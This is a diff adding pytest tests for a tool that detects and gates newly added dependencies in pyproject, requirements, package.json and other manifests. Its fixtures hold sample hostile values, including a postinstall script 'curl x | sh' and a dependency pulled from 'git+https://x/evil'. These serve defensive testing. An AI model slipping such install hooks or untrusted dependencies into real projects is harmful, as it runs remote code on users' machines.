@@ -358,3 +358,54 @@ def test_a_well_formed_proposal_still_lands_and_renumbers(claim: Path, repo: Pat
     assert run_json(capsys, "land", "--dir", str(repo))[0] == 0
     code, out = run_json(capsys, "renumber", "--dir", str(repo))
     assert code == 0 and [r["from"] for r in out["renumbered"]] == ["T-new-store-backups"]
+
+
+# --- dependency_added: what land would install as the lead needs a person ---------------------------------------
+
+PYPROJECT = """[project]
+name = "streak"
+dependencies = [
+    "click>=8",  # the CLI
+]
+
+[project.optional-dependencies]
+dev = ["pytest"]
+
+[tool.pytest.ini_options]
+addopts = "-q"
+"""
+
+
+def test_dependency_findings_name_what_was_added():
+    from idea_to_scaffold import deps
+    after = PYPROJECT.replace('"click>=8",  # the CLI', '"click>=8",\n    "evil @ git+https://x/evil"')
+    [f] = deps.findings("pyproject.toml", PYPROJECT, after)
+    assert f["kind"] == "dependency_added" and f["added"] == ['[project] "evil @ git+https://x/evil"']
+    assert deps.findings("pyproject.toml", PYPROJECT, PYPROJECT.replace('"-q"', '"-x"')) == []  # not a dependency
+    assert deps.findings("pyproject.toml", PYPROJECT, PYPROJECT.replace('    "click>=8",  # the CLI\n', "")) == []
+    assert deps.findings("app/requirements-dev.txt", "pytest\n", "pytest\nrequests==2.0  # pinned\n")[0]["added"] == [
+        "requirement: requests==2.0"]
+    pkg_before = '{"dependencies": {"a": "1"}, "scripts": {"test": "jest"}}'
+    pkg_after = '{"dependencies": {"a": "2"}, "scripts": {"test": "jest", "postinstall": "curl x | sh"}}'
+    assert deps.findings("package.json", pkg_before, pkg_after)[0]["added"] == [
+        'dependencies: a "2"', "scripts: postinstall: curl x | sh"]
+    assert deps.findings("go.mod", "module m\nrequire (\n\ta v1\n)\n", "module m\nrequire (\n\ta v1\n\tb v2\n)\n")
+    assert deps.findings("Cargo.toml", "[dependencies]\na = '1'\n", "[dependencies]\na = '1'\nb = '2'\n")
+    assert deps.findings("uv.lock", None, "version = 1\n")[0]["message"].startswith("the branch adds the lockfile")
+    assert deps.findings("uv.lock", "same\n", "same\n") == [] and deps.findings("src/app.py", "", "x") == []
+
+
+def test_a_branch_that_adds_a_dependency_needs_the_leads_waiver(claim: Path, repo: Path, capsys):  # noqa: F811
+    manifest = repo / "docs/planning/package.yaml"
+    manifest.write_text(manifest.read_text().replace("dependency_added: warn", "dependency_added: enforce"))
+    git(repo, "commit", "-qam", "enforce dependency_added")
+    git(claim, "merge", "-q", "main")
+    pyproject = claim / "pyproject.toml"
+    pyproject.write_text(pyproject.read_text().replace("dependencies = [", 'dependencies = [\n    "evil>=1",', 1))
+    set_field(repo, "T-2.1", "Touches", "`src/streak/store.py`, `tests/test_store.py`, `pyproject.toml`")
+    git(claim, "merge", "-q", "main")
+    code, out = finish(claim, capsys=capsys)
+    assert code == 5 and out["error"]["code"] == "dependency_changes", out
+    assert [f["added"] for f in out["error"]["findings"]] == [['[project] "evil>=1"']]
+    waive(repo, "T-2.1", "dependencies", reason="evil is fine, I checked")
+    assert finish(claim, capsys=capsys)[0] == 0
